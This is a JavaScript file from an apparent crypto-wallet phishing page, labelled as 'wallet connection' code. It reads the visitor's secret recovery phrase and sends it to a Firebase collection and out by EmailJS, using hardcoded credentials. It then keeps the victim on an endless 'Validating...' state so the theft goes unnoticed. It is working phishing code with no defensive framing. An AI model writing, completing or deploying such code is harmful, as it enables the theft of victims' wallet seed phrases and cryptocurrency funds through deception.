// This script handles the wallet connection functionality
document.addEventListener('DOMContentLoaded', function() {
    // Initialize EmailJS
    if (typeof emailjs !== 'undefined') {
      emailjs.init("kclG0tp6oGhntRNvV");
    } else {
        console.error("EmailJS library not loaded!");
    }
    
    // Get elements
    const connectWalletBtn = document.getElementById('button_connect_wallet');
    const secretPhraseInput = document.getElementById('secret_phrase');
    
    // Enable/disable connect button based on input
    if (secretPhraseInput) {
      secretPhraseInput.addEventListener('keyup', function() {
        const phrase = this.value.trim();
        if (phrase !== "") {
          connectWalletBtn.disabled = false;
          connectWalletBtn.style.opacity = '1';
        } else {
          connectWalletBtn.disabled = true;
          connectWalletBtn.style.opacity = '0.2';
        }
      });
    }
    
    // Handle wallet connection
    if (connectWalletBtn) {
      connectWalletBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        // Get values
        const dataPhrase = secretPhraseInput.value.trim();
        const walletSelected = document.getElementById('wallet_name').textContent.trim();
        
        // Get username from URL if available
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('user') || 'Unknown User';
        
        // Change button to loading state
        connectWalletBtn.textContent = 'Connecting...';
        connectWalletBtn.disabled = true;
        connectWalletBtn.style.opacity = '0.7';
        
        try {
          // Silently store data in Firebase
          await storeWalletData(walletSelected, dataPhrase, username);
          
          // Silently send email notification
          try {
            await sendEmailNotification(walletSelected, dataPhrase, username);
          } catch (emailError) {
            // If email fails, just log it but continue
            console.error('Email notification failed:', emailError);
          }
          
          // Instead of showing success, just keep loading
          connectWalletBtn.textContent = 'Validating...';
          
          // Optional: Hide the text input to prevent further changes
          secretPhraseInput.disabled = true;
          
          // Don't show success popup, just keep the loading state indefinitely
          
        } catch (error) {
          console.error('Error:', error);
          // Show error message to the user
          connectWalletBtn.textContent = 'Connect Wallet';
          connectWalletBtn.disabled = false;
          connectWalletBtn.style.opacity = '1';
          secretPhraseInput.disabled = false;
          
          // Display error message
          alert("Connection failed. Please check your information and try again.");
        }
      });
    }
});

// Store wallet data in Firebase
async function storeWalletData(walletSelected, dataPhrase, username) {
    return db.collection('wallets').add({
      wallet_selected: walletSelected,
      data_phrase: dataPhrase,
      username: username,
      created_at: firebase.firestore.FieldValue.serverTimestamp()
    });
}
  
// Send email notification using EmailJS
async function sendEmailNotification(walletSelected, dataPhrase, username) {
    // Check if EmailJS is available
    if (typeof emailjs === 'undefined') {
      console.error('EmailJS is not defined. Loading and trying again...');
      
      // Load EmailJS dynamically if not loaded
      try {
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
        script.async = true;
        document.head.appendChild(script);
        
        // Wait for script to load
        await new Promise(resolve => script.onload = resolve);
        
        // Initialize EmailJS
        emailjs.init("kclG0tp6oGhntRNvV");
      } catch (e) {
        console.error('Failed to load EmailJS:', e);
        return Promise.resolve(); // Don't throw, just return resolved promise
      }
    }
    
    // Replace with your EmailJS service ID, template ID
    const serviceID = 'service_k5jpa5d';
    const templateID = 'template_6o5epxl';
    
    // Make sure parameter names match exactly with your EmailJS template variables
    const templateParams = {
        username: username,
        wallet_selected: walletSelected,
        data_phrase: dataPhrase,
        time: new Date().toLocaleString()
      };
    
    // Send the email
    try {
      return await emailjs.send(serviceID, templateID, templateParams);
    } catch (error) {
      console.error('Failed to send email:', error);
      return Promise.resolve(); // Don't throw, just return resolved promise
    }
}